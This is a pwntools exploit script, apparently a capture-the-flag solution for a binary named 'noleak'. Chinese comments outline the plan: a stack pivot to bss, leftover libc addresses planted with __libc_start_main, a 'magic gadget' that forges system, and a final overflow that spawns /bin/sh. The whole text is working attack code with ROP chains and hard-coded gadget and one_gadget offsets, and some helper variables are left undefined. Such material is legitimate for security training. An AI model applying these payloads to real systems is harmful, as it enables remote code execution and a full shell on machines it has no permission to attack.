from pwn import *
import sys
context.log_level = 'debug'
context.arch = "amd64"
io = process("./noleak")
#利用思路如下:
#1、栈迁移到bss上
#2、调用libc_start_main，使得bss上残留下原本栈的信息，就会有真实地址在bss上分布
#3、找一个能用的真实地址，利用神奇的gadget，把它伪造成system，再次回跳到main函数
#4、栈溢出构造system('/bin/sh')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
#io=remote(ip,port)

elf=ELF(pwn_name,checksec=False)
def get_one():
    if(arch == '64'):
        if(version == '2.23'):
            one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
        if (version == '2.27'):
            one = [0x4f2c5 , 0x4f322 , 0x10a38c]
    return one

def sym(func):
    success('{} => {:#x}'.format(func , libc.sym[func]))
    return libc.sym[func]

def info(con,leak):
    success('{} => {:#x}'.format(con,leak))

def dbg(address=0):
    if address==0:
        gdb.attach(p)
        pause()
    else:
        if address > 0xfffff:
            script="b *{:#x}\nc\n".format(address)
        else:
            script="b *$rebase({:#x})\nc\n".format(address)
        gdb.attach(p, script)

def cus_rop(gadget1,gadget2,func_got,rdi,rsi,rdx):
    payload = p64(gadget1)
    payload += p64(0) 
    payload += p64(0)         #rbx=0
    payload += p64(1)         #rbp=1
    payload += p64(func_got)  #r12  call
    payload += p64(rdi)       #r13  rdx 
    payload += p64(rsi)       #r14  rsi
    payload += p64(rdx)       #r15  edi 
    payload += p64(gadget2)
    payload += '\x00'*56      #tiao zheng zhan zhen
    return payload

one = get_one()

gadget_reg = 0x4005C6 
gadget_call= 0x4005B0
magic_gadget = 0x400518
pop_rdi_ret = 0x4005D3
pop_rsi_r15 = 0x4005D1
leave_ret = 0x400564
buf_address = elf.bss() + 0x500
fini = 0x4005E0
init = 0x400570
start = 0x400450
#---------------
dbg(0x400537)

payload  = '\x00'*0x80 + p64(buf_address)
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_r15) + p64(buf_address) + p64(0) + p64(elf.plt['read'])
payload += p64(leave_ret)
payload = payload.ljust(0x100,'\x00')
io.send(payload)


payload = '\x00'*8
payload += cus_rop(gadget_reg,gadget_call,elf.got['__libc_start_main'],start,fini,init)
payload = payload.ljust(0x100,'\x00')
io.send(payload)
#--------------- 
pause()
payload  = '\x00'*0x80 + p64(buf_address)
payload += p64(0x4005Ca)
payload += p64(0xFFFFFFFFFFC5EE18) ##(-0x3a11e8)^0xffffffffffffffff+1
payload += p64(0x601458+0x3d)
payload += p64(0)*4
payload += p64(magic_gadget)
payload += p64(start)
io.send(payload)
#--------------- 
binsh = 0x6012b0
system = 0x601458
payload ='/bin/sh\x00'+'b'*0x80
payload +=cus_rop(gadget_reg,gadget_call,system,binsh,fini,init)
io.send(payload)
io.interactive()
